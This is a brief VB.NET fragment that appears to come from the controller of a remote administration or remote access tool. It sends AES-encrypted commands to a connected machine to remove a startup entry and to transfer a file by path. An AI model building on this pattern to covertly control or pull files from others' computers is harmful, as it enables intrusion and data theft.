Public Class SystemInformation
  Sub RemoveStartup()
    connected.Send(New Encryption().AES_Encrypt("RemovefromStartup" & item.Text, key))
  End Sub
  Sub DownloadFile()
    connected.Send(New Encryption().AES_Encrypt("sharefile" & path, key))
  End Sub
End Class
